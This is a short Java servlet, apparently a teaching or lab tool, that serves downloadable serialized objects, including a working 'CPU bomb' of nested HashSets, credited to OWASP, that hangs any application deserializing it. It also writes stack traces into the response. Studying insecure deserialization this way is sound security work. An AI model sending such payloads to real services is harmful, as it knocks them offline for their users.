import java.io.*;
import java.util.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class Hacktory extends HttpServlet {

  // handle HTTP requests
  public void doGet(HttpServletRequest request, HttpServletResponse response)
                    throws ServletException, IOException {

    String path = request.getPathInfo() == null ? "" : request.getPathInfo();

    try {
      switch (path) {
        case "/string.ser":
          // serialized a string
          serializeAnything(new String("this is a joke"),
                            response, "string.ser");
          break;
        case "/cpu-bomb.ser":
          // serialize a CPU DoS payload
          serializeAnything(CPUbomb(),
                            response, "cpu-bomb.ser");
          break;
        default:
          // display links to the downloadable objects
          request.getRequestDispatcher("/WEB-INF/hacktory.jsp").forward(request, response);
      }
    } catch (Exception e) {
      PrintWriter out = response.getWriter();
      response.setContentType("text/plain");
      e.printStackTrace(out);
    }
  }

  // serialize an object and stuff it into HTTP response
  private void serializeAnything(Object obj, HttpServletResponse response, String fname)
                                 throws IOException {
    // necessary headers
    response.setContentType("application/x-binary");
    response.setHeader("Content-Disposition", "attachment; filename=" + fname);

    // output to HTTP response
    OutputStream        os = response.getOutputStream();
    
    // ObjectOutputStream so we could serialize
    ObjectOutputStream oos = new ObjectOutputStream(os);
    
    // actual serialization
    oos.writeObject(obj);
    
    // close and exit
    oos.close();
    os.close();
  }

  // borrowed from https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
  @SuppressWarnings("unchecked")
  static Object CPUbomb() {
    Set root = new HashSet();
    Set s1 = root;
    Set s2 = new HashSet();
    for (int i = 0; i < 100; i++) {
      Set t1 = new HashSet();
      Set t2 = new HashSet();
      t1.add("foo");
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
    }
    return (Object) root;
  }

}
